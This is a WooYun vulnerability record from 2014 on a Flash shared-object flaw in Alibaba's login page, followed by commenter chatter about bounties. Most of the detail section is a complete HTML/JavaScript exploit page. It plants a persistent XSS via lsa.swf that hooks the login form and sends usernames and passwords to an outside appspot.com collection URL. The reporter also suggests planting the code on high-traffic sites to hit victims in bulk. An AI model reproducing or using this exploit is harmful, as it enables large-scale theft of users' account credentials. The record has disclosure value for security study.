{"id": 4449, "wybug_id": "wooyun-2014-054102", "wybug_title": "我是如何实现批量种植rootkit窃取阿里云账号密码的", "wybug_corp": "阿里巴巴", "wybug_author": "牛奶坦克", "wybug_date": "2014-03-20 16:18", "wybug_open_date": "2014-05-04 16:19", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误", "设计错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-04：\t细节向公众公开  简要描述： 如题，从乌云里学到的然后来找下就来报告了，求5w 详细说明：  打开 mail.aliyun.com 跳转到 https://passport.alipay.com/login/login.htm?return_url=http%3A%2F%2Fmail.aliyun.com%2Falimail%2Fauth%2FcallbackForHavana%3Freurl%3D%252Falimail%252F&fromSite=9，查找DOM可查找到https://img.alipay.com/common/um/lsa.swf?v=1，分析SWF文件可知存在与  WooYun: 一个可大规模悄无声息窃取淘宝/支付宝账号与密码的漏洞 -（埋雷式攻击附带视频演示）  报告中相同的漏洞，看来这个需要大检查啊\n<html><head><style>body{background:#000;color:#00ff00;}a{color:#fff;}a:visited{color:#fff;}</style><meta charset=\"gb2312\"></head><body><script>//flash rookit templatevar siteName=\"阿里云邮箱\";var siteURL=\"http://mail.aliyun.com/\";var funcName=\"setCookie\";var inputs=[\"loginId\",\"password\",\"fm-login-submit\"];var rec=\"https://jsfile2012.appspot.com/paypalpoc?data=\";var buttonClassName=\"fm-button fm-submit\";var demoMethod=\"alert\"; // 可能的值: alert(弹窗), send(发送)</script><object id=\"JSocket\" tabindex=\"-1\" classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\" width=\"1\" height=\"1\" codebase=\"http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">       <param name=\"movie\" value=\"http://img.alipay.com/common/um/lsa.swf?v=1\">       <param name=\"allowScriptAccess\" value=\"always\">       <embed name=\"JSocket\" src=\"http://img.alipay.com/common/um/lsa.swf?v=1\" width=\"1\" height=\"1\" allowscriptaccess=\"always\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.adobe.com/go/getflashplayer\"></object><center><h2>这是一个窃取<script>document.write(siteName);</script>的XSS演示！<br/><br/><div style=\"width:400px;border:1px solid #00ff00;height:30px;text-align:left;\"><div id=\"pb\" style=\"width:10px;background:#00ff00;height:30px;\">&nbsp;</div></div><span id=\"ok\">&nbsp;</span></h2></center><script>var tcount=1;function setxss(){document['JSocket'][funcName]('_umdata','\\\\\";location.href=\\'javascript:%28function%28%29%7btry%7bfunction $n%28i%29%7bvar a=document.getElementsByName%28i%29;return a.length?a[0]:null%7d;var%20pwd=$n%28%27'+inputs[1]+'%27%29||$n%28%27'+inputs[1]+'%27%29;pwd.onblur=function%28%29%7bwindow.ppp=%28$n%28%27'+inputs[1]+'%27%29||$n%28%27'+inputs[1]+'%27%29||%7b%7d%29.value%7d;var xx=document.getElementById%28\"'+inputs[2]+'\"%29;xx.type=%27button%27;xx.onclick=function%28%29%7bif%28window.$s%29%7breturn true;%7delse%7bxx.setAttribute%28%27class%27,%27'+buttonClassName+'%27%29;xx.value=decodeURIComponent%28%27%25E6%25AD%25A3%25E5%259C%25A8%25E8%25BF%259B%25E5%2585%25A5...%27%29;'+(demoMethod==\"alert\"?('alert%28$n%28%27'+inputs[0]+'%27%29.value+%27|||%27+window.ppp%29;'):('new Image%28%29.src=%27'+rec+'%27+escape%28$n%28%27'+inputs[0]+'%27%29.value+%27|||%27+window.ppp%29;'))+'window.$s=1;setTimeout%28function%28%29%7bxx.type=%27submit%27;xx.click%28%29;%7d,5000%29;return false;%7d%7d;%7dcatch%28e%29%7b%7d%7d%29%28%29;\\';//');}//alert%28%27hooked%27%29//function setxss(){document['JSocket'].setlso('\\\\\";location.href=\\'javascript:alert%281%29\\';0//');}function ccbar(){\tvar x=setTimeout(function(){\t\ttcount++;\t\tif(tcount>=40){\t\t\tclearTimeout(x);\t\t\tdocument.getElementById(\"pb\").style.width=\"400px\";\t\t\tdocument.getElementById(\"ok\").innerHTML=\"<br/>现在你可以作为受害者登录<a target='_blank' href='\"+siteURL+\"'>\"+siteName+\"</a>\";\t\t}else{\t\t\tdocument.getElementById(\"pb\").style.width=tcount*10+\"px\";\t\t\tccbar();\t\t}\t},1000/24);}function dodo(){\tvar x = setTimeout(function(){\t\tif(document['JSocket'][funcName]){\t\t\tclearTimeout(x);\t\t\tconsole.log(\"ok\");\t\t\tsetxss();\t\t\tccbar();\t\t}else{\t\t\ttcount++;\t\t\tdocument.getElementById(\"pb\").style.width=tcount*10+\"px\";\t\t\tdodo();\t\t}\t},100);}dodo();</script></body></html>\n至于利用的方式，可以在流量大的地方挂上这段代码植入rootkit   漏洞证明：  \n\n\n\n   修复方案：     版权声明：转载请注明来源 牛奶坦克@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-21 11:08 厂商回复： 感谢您对我们的关注和支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-20 16:22 |    \t\tadmin1993 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:39        | 0101001010010100101001010010100101001010...)\t\t \n  前排围观    \n     2014-03-20 16:31 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  碉堡啊！！    \n     2014-03-20 16:54 |    \t\t啦绯哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:20        )\t\t \n  5万的节奏    \n     2014-03-20 17:03 |    \t\tPanFake \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:5        | 略懂略懂)\t\t \n  这个会给5W？！围观！！我觉得阿里给“免费一年阿里云”。。。哈哈~    \n     2014-03-20 17:06 |    \t\t浮生若梦 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:7        | 浮生若梦)\t\t \n  前排围观。。等待公开！    \n     2014-03-20 17:10 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  已收藏，感谢分享！    \n     2014-03-20 17:17 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  呦 呦  check it now    \n     2014-03-20 17:21 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  也不知道前面的5w兑现没~    \n     2014-03-20 18:15 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-03-20 18:38 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  wocao    \n     2014-03-20 21:22 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  坐等阿里上市成功，然后被做空……    \n     2014-03-20 23:03 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  核心牛！    \n     2014-03-21 13:16 |    \t\txss_art \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:3        | 只会弹框框的跨站师。。。。)\t\t \n  这么吊。。    \n     2014-05-25 19:20 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  不知道前面的5w兑现没    \n     2014-05-26 16:15 |    \t\tcursesun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | nohack)\t\t \n  不知道前面的5w兑现没    \n     2014-05-31 19:07 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  @admin1993 354681170250这个是啥呀    \n     2014-05-31 19:10 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  @ddy 没事了，原来是010010100101001无意义的    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}